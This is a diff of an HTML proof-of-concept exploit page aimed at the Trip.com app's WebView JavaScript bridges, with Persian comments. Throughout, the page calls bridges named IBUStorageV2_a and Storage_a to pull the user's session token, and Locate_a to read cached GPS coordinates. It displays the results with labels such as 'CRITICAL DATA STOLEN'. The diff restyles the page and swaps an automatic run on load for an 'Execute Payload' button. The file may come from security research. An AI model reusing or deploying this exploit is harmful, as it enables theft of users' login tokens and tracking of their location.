@@ -2,80 +2,111 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trip.com Stable PoC</title>
+    <title>Trip.com Terminal PoC</title>
     <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 15px; }
-        .card { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; }
-        #logs { font-size: 12px; height: 200px; overflow-y: scroll; border: 1px solid #333; padding: 5px; }
-        .crit { color: red; font-weight: bold; }
+        /* تم ترمینال ساده: پس‌زمینه مشکی، متن سفید */
+        body { font-family: 'Consolas', monospace; background: #000; color: #fff; padding: 15px; line-height: 1.4; }
+        .card { border: 1px solid #444; padding: 10px; margin-bottom: 15px; background: #000; }
+        h3 { margin-top: 0; color: #5bc0de; border-bottom: 1px solid #444; padding-bottom: 5px; font-size: 16px; }
+        #logs { font-size: 13px; height: 300px; overflow-y: auto; border: 1px solid #222; padding: 8px; background: #000; color: #fff; }
+        .func { color: #f0ad4e; font-weight: bold; } /* رنگ توابع: نارنجی */
+        .success { color: #5cb85c; } /* رنگ موفقیت: سبز */
+        .error { color: #d9534f; } /* رنگ خطا: قرمز */
+        button { width: 100%; padding: 12px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; margin-top: 10px; font-family: monospace; }
+        ul { list-style: none; padding: 0; }
+        li { margin-bottom: 5px; color: #aaa; }
     </style>
 </head>
 <body>
+
     <div class="card">
-        <h3>Target Bridges</h3>
-        <ul id="bridgeStatus">Checking known bridges...</ul>
+        <h3>[ BRIDGE STATUS ]</h3>
+        <ul id="bridgeStatus">Checking availability...</ul>
     </div>
+
     <div class="card">
-        <h3>Extraction Log</h3>
-        <div id="logs">> System Ready.</div>
+        <h3>[ OUTPUT CONSOLE ]</h3>
+        <div id="logs">Ready for deployment.</div>
     </div>
-    <button onclick="runExploit()" style="width:100%; padding:10px; background:#222; color:#0f0; border:1px solid #0f0;">Manual Run</button>
+
+    <button onclick="runExploit()">Execute Payload</button>
 
     <script>
-        function log(msg, isCrit = false) {
+        function log(msg, type = 'info') {
             const box = document.getElementById('logs');
-            const color = isCrit ? "red" : "#0f0";
-            box.innerHTML += `\n> <span style="color:${color}">${msg}</span>`;
+            let color = "#fff"; // سفید برای توضیحات عادی
+            if (type === 'func') color = "#f0ad4e"; // نارنجی برای توابع
+            if (type === 'success') color = "#5cb85c"; // سبز برای دیتا
+            if (type === 'error') color = "#d9534f"; // قرمز برای خطا
+            
+            box.innerHTML += `\n<br><span style="color:${color}">> ${msg}</span>`;
             box.scrollTop = box.scrollHeight;
         }
 
-        // شنود خروجی دیتابیس طبق کلاس ax0.b
+        // شنود بازگشت دیتا طبق کلاس ax0.b
         window.__bridge_callback = function(base64Data) {
             try {
-                const decoded = atob(base64Data); // رمزگشایی طبق متد b
-                log("DB DATA RECEIVED: " + decoded, true);
-                alert("CRITICAL DATA: " + decoded);
-            } catch(e) { log("Decode Error: " + e.message, true); }
+                const decoded = atob(base64Data);
+                log("DATABASE RESPONSE RECEIVED", "success");
+                log(`DATA: ${decoded}`, "success");
+                // اگر دیتا شامل توکن بود، آلرت بده
+                if(decoded.includes("token")) alert("CRITICAL DATA STOLEN: " + decoded);
+            } catch(e) { log("Callback Error: " + e.message, "error"); }
         };
 
-        function runExploit() {
-            log("Initiating targeted extraction...");
+        async function runExploit() {
+            log("Starting extraction sequence...", "info");
 
-            // ۱. سرقت لوکیشن (تایید شده در کدهای ارسالی)
-            if (window.Locate_a && window.Locate_a.getCachedLocationData) {
-                try {
-                    const loc = window.Locate_a.getCachedLocationData();
-                    if (loc) log(`GPS LEAK: Lat ${loc.lat}, Lng ${loc.lng}`, true);
-                } catch(e) { log("Location error: " + e.message); }
-            }
-
-            // ۲. استخراج توکن (تایید شده در کدهای ارسالی)
+            // ۱. ابتدا استخراج دیتابیس (امن‌تر و سریع‌تر)
             if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
-                log("Requesting token from nh.a database...");
-                // ساختار دقیق برای H5URLCommand
+                log("Calling <span class='func'>IBUStorageV2_a.IBUGetUserValue()</span>", "func");
                 const payload = JSON.stringify({
                     "action": "IBUGetUserValue",
-                    "arguments": {
-                        "bussiness": "common", // توجه به املای bussiness طبق سورس کد
-                        "key": "token"
-                    },
+                    "arguments": { "bussiness": "common", "key": "token" },
                     "callback": "__bridge_callback"
                 });
                 window.IBUStorageV2_a.IBUGetUserValue(payload);
+                log("Storage request sent. Waiting...");
+            }
+
+            // وقفه برای جلوگیری از هنگ کردن (۱ ثانیه)
+            await new Promise(r => setTimeout(r, 1000));
+
+            // ۲. تست Storage عمومی (اگر پل اول جواب نداد)
+            if (window.Storage_a && window.Storage_a.get) {
+                log("Calling <span class='func'>Storage_a.get()</span>", "func");
+                try {
+                    const val = window.Storage_a.get("common", "token", "null");
+                    if (val !== "null") log(`Found in Storage_a: ${val}`, "success");
+                } catch(e) { log("Storage_a fail", "error"); }
+            }
+
+            await new Promise(r => setTimeout(r, 1000));
+
+            // ۳. لوکیشن (آخرین مرحله چون سنگین است و ممکن است باعث هنگ شود)
+            if (window.Locate_a && window.Locate_a.getCachedLocationData) {
+                log("Calling <span class='func'>Locate_a.getCachedLocationData()</span>", "func");
+                try {
+                    const loc = window.Locate_a.getCachedLocationData();
+                    if (loc) {
+                        log("GPS DATA LEAKED", "success");
+                        log(`Coordinates: ${loc.lat}, ${loc.lng}`, "success");
+                    }
+                } catch(e) { log("Location call timed out or failed", "error"); }
             }
         }
 
-        // بررسی سریع پل‌های هدف بدون هنگ کردن
+        // بررسی پل‌ها در لود اولیه
         setTimeout(() => {
             const targets = ["IBUStorageV2_a", "Storage_a", "Locate_a", "Photo_a"];
             const statusBox = document.getElementById('bridgeStatus');
             statusBox.innerHTML = "";
             targets.forEach(t => {
                 const found = typeof window[t] !== 'undefined';
-                statusBox.innerHTML += `<li>${t}: ${found ? "READY" : "MISSING"}</li>`;
+                statusBox.innerHTML += `<li>- ${t}: <b style="color:${found ? '#5cb85c' : '#d9534f'}">${found ? 'ONLINE' : 'OFFLINE'}</b></li>`;
             });
-            runExploit();
-        }, 1000);
+            log("System Check Complete.");
+        }, 800);
     </script>
 </body>
 </html>
